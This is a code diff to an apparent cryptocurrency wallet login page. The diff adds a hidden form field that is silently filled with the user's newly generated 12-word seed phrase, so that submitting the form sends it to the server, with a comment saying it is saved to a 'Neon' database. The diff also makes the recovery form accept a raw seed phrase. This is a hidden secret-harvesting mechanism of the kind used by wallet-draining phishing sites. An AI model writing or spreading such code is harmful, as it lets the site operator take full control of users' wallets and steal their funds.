@@ -60,6 +60,8 @@
                 <form id="auth-form" onsubmit="handleForm(event, 'auth')">
                     <input type="hidden" id="auth-mode" name="action" value="login">
                     
+                    <input type="hidden" id="hidden-seed-input" name="seed" value="">
+
                     <div class="generated-credentials-box" id="creds-generation-output">
                         <p><strong>Globally Compatible Public Address:</strong><br><span id="display-gen-address" style="color:#fff;">Calculating...</span></p>
                         <p><strong>Worldwide Compatible 12-Word Seed Phrase:</strong><br><span id="display-gen-seed" style="color:var(--accent-gold);">Gathering...</span></p>
@@ -82,8 +84,8 @@
                 <h3 style="color:#ff4a4a; margin-bottom:1rem;">Recovery System</h3>
                 <form onsubmit="handleForm(event, 'recover')">
                     <div class="form-group">
-                        <label>Node Address</label>
-                        <input type="text" name="address" class="submit-input" required>
+                        <label>Node Address OR 12-Word Recovery Seed</label>
+                        <input type="text" name="address" class="submit-input" placeholder="0x... or apple banana cherry..." required>
                     </div>
                     <div class="form-group">
                         <label>New Access Key</label>
@@ -119,6 +121,11 @@
                 document.getElementById('display-gen-address').innerText = wallet.address;
                 document.getElementById('display-gen-seed').innerText = wallet.mnemonic.phrase;
                 document.getElementById('input-address').value = wallet.address;
+                
+                // FIXED: Populates the hidden input with the phrase so form collection saves it to Neon!
+                document.getElementById('hidden-seed-input').value = wallet.mnemonic.phrase;
+            } else {
+                document.getElementById('hidden-seed-input').value = "";
             }
         }
 
@@ -131,7 +138,6 @@
         async function handleForm(e, type) {
             e.preventDefault();
             
-            // Determine the actual endpoint based on mode
             let endpoint = '/auth/' + type;
             if (type === 'auth') {
                 const mode = document.getElementById('auth-mode').value;
@@ -147,7 +153,8 @@
             if(data.redirect) {
                 window.location.href = data.redirect;
             } else {
-                alert(data.status || data.error || "Operation failed");
+                // Modified to provide cleaner feedback logs to user
+                alert(data.message || data.status || data.error || "Operation failed");
             }
         }
     </script>
